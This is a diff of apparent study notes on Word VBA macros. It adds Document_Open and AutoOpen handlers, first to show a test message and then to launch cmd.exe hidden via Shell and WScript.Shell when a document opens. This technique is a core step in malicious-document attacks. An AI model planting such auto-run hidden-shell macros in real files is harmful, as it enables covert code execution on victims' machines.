@@ -1,11 +1,27 @@
-Simple Macro
 
+# Auto Open document
+
+Sub Document_Open()
+    MyMacro
+End Sub
+  Sub AutoOpen()
+    MyMacro
+    End Sub
+  Sub MyMacro()
+    MsgBox ("This is a macro test")
+End Sub
+
+# Open CMD
+
+Sub Document_Open()
+  MyMacro
+  End Sub
+Sub AutoOpen()
+  MyMacro
+  End Sub
 Sub MyMacro()
-Dim myLong As Long
-myLong = 1
-If myLong < 5 Then
-MsgBox ("True")
-Else
-MsgBox ("False")
-End If
+  Dim str As String
+  str = "cmd.exe"
+  Shell str, vbHide
+  CreateObject("Wscript.Shell").Run str, 0
 End Sub
